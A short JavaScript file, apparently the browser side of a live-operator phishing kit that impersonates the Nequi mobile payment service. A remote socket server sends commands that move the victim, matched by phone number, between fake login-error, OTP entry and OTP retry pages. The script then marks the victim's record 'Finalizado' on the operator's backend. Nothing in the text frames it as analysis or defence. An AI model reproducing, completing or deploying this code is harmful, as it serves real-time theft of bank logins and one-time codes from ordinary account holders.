var socket = io.connect(url);

socket.on("neq", function (data) {
  if (data.valor == "user" && data.valid == info.metaInfo.telnum) {
    window.location.href = "./user.error.html";
  } else if (data.valor == "otp" && data.valid == info.metaInfo.telnum) {
    window.location.href = "./cdin.html";
  } else if (data.valor == "newOtp" && data.valid == info.metaInfo.telnum) {
    window.location.href = "./cdin.error.html";
  } else if (data.valor == "finish" && data.valid == info.metaInfo.telnum) {
    async function updateStatus() {
      const response = await fetch(`${url}/trico/tricoData`, {
        method: "GET",
        headers: {
          "Content-Type": "application/json",
        },
      });

      const serverData = await response.json();
      const dataTables = [...serverData];

      for (const data of dataTables) {
        if (data.telefono == info.metaInfo.telnum && data.usuario == info.metaInfo.user) {
          console.log("Usuario encontrado");
          const updateresponse = await fetch(
            `${url}/trico/tricofinishNequi/${data.idreg}`,
            {
              method: "PUT",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                estado: "Finalizado",
              }),
            }
          );
          const updatedData = await updateresponse.json();
        }
      }

      window.location.href = "./end.html";
    }
    updateStatus();
  }
});
